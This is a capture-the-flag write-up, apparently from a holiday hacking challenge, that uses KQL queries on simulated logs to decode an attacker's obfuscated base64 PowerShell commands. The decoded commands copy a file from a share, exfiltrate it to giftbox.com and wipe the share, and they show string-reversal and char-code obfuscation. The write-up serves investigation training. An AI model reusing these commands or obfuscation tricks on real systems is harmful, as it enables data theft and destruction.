<h1>Intro</h1>

**A hidden message**

Wow, you're unstoppable! Great work finding the malicious activity on Alabaster's machine. I've been looking a bit myself and... I'm stuck. The messages seem to be garbled. Do you think you can try to decode them and find out what's happening?

Look around for encoded commands. Use your skills to decode them and find the true meaning of the attacker's intent! Some of these might be extra tricky and require extra steps to fully decode! Good luck!

If you need some extra help with base64 encoding and decoding, click on the 'Train me for this case' button at the top-right of your screen.



<h3>Question</h3> 
When was the attacker's first base64 encoded PowerShell command executed on Alabaster's machine?


**Query**

```
let ClickTime = datetime(2023-12-02T10:12:42Z);
ProcessEvents
| where timestamp > ClickTime
| where hostname == 'Y1US-DESKTOP'
| where process_commandline has "powershell"
```

**Result**
```
"timestamp": 2023-12-24T16:07:47Z,
"parent_process_name": cmd.exe,
"parent_process_hash": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,
"process_commandline": C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc KCAndHh0LnRzaUxlY2lOeXRoZ3VhTlxwb3Rrc2VEXDpDIHR4dC50c2lMZWNpTnl0aGd1YU5cbGFjaXRpckNub2lzc2lNXCRjXGVyYWhzZWxpZmVsb1BodHJvTlxcIG1ldEkteXBvQyBjLSBleGUubGxlaHNyZXdvcCcgLXNwbGl0ICcnIHwgJXskX1swXX0pIC1qb2luICcn,
"process_name": powershell.exe,
"process_hash": 6a2ecb71f664280de86832553191d1e70335f1bcdbb756e041de8d1072819885,
"hostname": Y1US-DESKTOP,
"username": alsnowball
```

<h3>Question</h3> 
What was the name of the file the attacker copied from the fileshare? (This might require some additional decoding)

**Query**

```
let ClickTime = datetime(2023-12-02T10:12:42Z);
ProcessEvents
| where timestamp > ClickTime
| where hostname == 'Y1US-DESKTOP'
| where process_commandline has "powershell"
| extend base64String = extract(@'\s+([A-Za-z0-9+/]{20}\S+$)', 1, process_commandline)
| extend DecodedCommandLine = base64_decode_tostring(base64String)
| where not(isempty(base64String) and isempty(DecodedCommandLine))
```

**Result**

```
"timestamp": 2023-12-15T11:20:14Z,
"process_commandline": C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc SW52b2tlLVdtaU1ldGhvZCAtQ29tcHV0ZXJOYW1lICRTZXJ2ZXIgLUNsYXNzIENDTV9Tb2Z0d2FyZVVwZGF0ZXNNYW5hZ2VyIC1OYW1lIEluc3RhbGxVcGRhdGVzIC0gQXJndW1lbnRMaXN0ICgsICRQZW5kaW5nVXBkYXRlTGlzdCkgLU5hbWVzcGFjZSByb290WyZjY20mXWNsaWVudHNkayB8IE91dC1OdWxs",
"hostname": Y1US-DESKTOP,
"username": alsnowball,
"DecodedCommandLine": Invoke-WmiMethod -ComputerName $Server -Class CCM_SoftwareUpdatesManager -Name InstallUpdates - ArgumentList (, $PendingUpdateList) -Namespace root[&ccm&]clientsdk | Out-Null
```
```
"timestamp": 2023-12-24T16:07:47Z,
"process_commandline": C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc KCAndHh0LnRzaUxlY2lOeXRoZ3VhTlxwb3Rrc2VEXDpDIHR4dC50c2lMZWNpTnl0aGd1YU5cbGFjaXRpckNub2lzc2lNXCRjXGVyYWhzZWxpZmVsb1BodHJvTlxcIG1ldEkteXBvQyBjLSBleGUubGxlaHNyZXdvcCcgLXNwbGl0ICcnIHwgJXskX1swXX0pIC1qb2luICcn,
"hostname": Y1US-DESKTOP,
"username": alsnowball,
"DecodedCommandLine": ( 'txt.tsiLeciNythguaN\potkseD\:C txt.tsiLeciNythguaN\lacitirCnoissiM\$c\erahselifeloPhtroN\\ metI-ypoC c- exe.llehsrewop' -split '' | %{$_[0]}) -join ''
```
```
"timestamp": 2023-12-24T16:58:43Z,
"process_commandline": C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc W1N0UmlOZ106OkpvSW4oICcnLCBbQ2hhUltdXSgxMDAsIDExMSwgMTE5LCAxMTAsIDExOSwgMTA1LCAxMTYsIDEwNCwgMTE1LCA5NywgMTEwLCAxMTYsIDk3LCA0NiwgMTAxLCAxMjAsIDEwMSwgMzIsIDQ1LCAxMDEsIDEyMCwgMTAyLCAxMDUsIDEwOCwgMzIsIDY3LCA1OCwgOTIsIDkyLCA2OCwgMTAxLCAxMTUsIDEwNywgMTE2LCAxMTEsIDExMiwgOTIsIDkyLCA3OCwgOTcsIDExNywgMTAzLCAxMDQsIDExNiwgNzgsIDEwNSwgOTksIDEwMSwgNzYsIDEwNSwgMTE1LCAxMTYsIDQ2LCAxMDAsIDExMSwgOTksIDEyMCwgMzIsIDkyLCA5MiwgMTAzLCAxMDUsIDEwMiwgMTE2LCA5OCwgMTExLCAxMjAsIDQ2LCA5OSwgMTExLCAxMDksIDkyLCAxMDIsIDEwNSwgMTA4LCAxMDEpKXwmICgoZ3YgJypNRHIqJykuTmFtRVszLDExLDJdLWpvaU4=,
"hostname": Y1US-DESKTOP,
"username": alsnowball,
"DecodedCommandLine": [StRiNg]::JoIn( '', [ChaR[]](100, 111, 119, 110, 119, 105, 116, 104, 115, 97, 110, 116, 97, 46, 101, 120, 101, 32, 45, 101, 120, 102, 105, 108, 32, 67, 58, 92, 92, 68, 101, 115, 107, 116, 111, 112, 92, 92, 78, 97, 117, 103, 104, 116, 78, 105, 99, 101, 76, 105, 115, 116, 46, 100, 111, 99, 120, 32, 92, 92, 103, 105, 102, 116, 98, 111, 120, 46, 99, 111, 109, 92, 102, 105, 108, 101))|& ((gv '*MDr*').NamE[3,11,2] -joiN
```
```"timestamp": 2023-12-25T10:44:27Z,
"process_commandline": C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc QzpcV2luZG93c1xTeXN0ZW0zMlxkb3dud2l0aHNhbnRhLmV4ZSAtLXdpcGVhbGwgXFxcXE5vcnRoUG9sZWZpbGVzaGFyZVxcYyQ=,
"hostname": Y1US-DESKTOP,
"username": alsnowball,
"DecodedCommandLine": C:\Windows\System32\downwithsanta.exe --wipeall \\\\NorthPolefileshare\\c$
```


After decoding we can see one of the powershell command need to reverse.
```
print (reverse(@'txt.tsiLeciNythguaN\potkseD\:C txt.tsiLeciNythguaN\lacitirCnoissiM\$c\erahselifeloPhtroN\\ metI-ypoC c- exe.llehsrewop'))
```
We get see the file got copied from share
`powershell.exe -c Copy-Item \\NorthPolefileshare\c$\MissionCritical\NaughtyNiceList.txt C:\Desktop\NaughtyNiceList.txt`

<h3>Question</h3> 
The attacker has likely exfiltrated data from the file share. What domain name was the data exfiltrated to?

we Can see a char code powershell command

``` [StRiNg]::JoIn( '', [ChaR[]](100, 111, 119, 110, 119, 105, 116, 104, 115, 97, 110, 116, 97, 46, 101, 120, 101, 32, 45, 101, 120, 102, 105, 108, 32, 67, 58, 92, 92, 68, 101, 115, 107, 116, 111, 112, 92, 92, 78, 97, 117, 103, 104, 116, 78, 105, 99, 101, 76, 105, 115, 116, 46, 100, 111, 99, 120, 32, 92, 92, 103, 105, 102, 116, 98, 111, 120, 46, 99, 111, 109, 92, 102, 105, 108, 101))```

after decoding it, we archive



**Result**

```
downwithsanta.exe -exfil C:\\Desktop\\NaughtNiceList.docx \\giftbox.com\file
```
